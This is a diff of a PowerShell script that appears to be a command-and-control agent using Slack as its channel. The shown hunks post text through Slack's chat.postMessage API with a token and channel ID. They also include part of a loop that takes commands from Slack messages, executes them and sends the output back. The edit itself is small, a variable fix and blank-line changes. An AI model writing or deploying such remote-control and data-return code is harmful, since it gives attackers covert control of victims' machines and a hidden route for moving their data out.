@@ -39,7 +39,6 @@ Last Updated: 5/31/18
         [string]$text = "",
         [string]$header = "" 
         )
-
         Write-Verbose "[+] Sending $text"
         
         $chars = $text.Length
@@ -58,7 +57,7 @@ Last Updated: 5/31/18
             }
 
             $attachment = Format-Table -InputObject $tmp | ConvertTo-Json
-            $body = @{"token" = $token; "channel" = $channelID; "attachments" = $attachment; "as_user" = $true; "text" = $header}
+            $body = @{"token" = $token; "channel" = $channelID; "attachments" = $attachment; "as_user" = $true; "text" = $text}
             Invoke-RestMethod -Uri "https://slack.com/api/chat.postMessage" -Body $body
         } until ($chars -eq 0)  
     }
@@ -447,6 +446,7 @@ Last Updated: 5/31/18
                         $var = Set-Location -PassThru $($response.text.substring(3))
                         Send-Message -Token $token -Channel $ChannelID -Text $var -Header $("Output of: " + $response.text)
                     }
+
 
                     elseif ($response.text.StartsWith("sleep","CurrentCultureIgnoreCase")) {
                         $sleep = $response.text.substring(6)
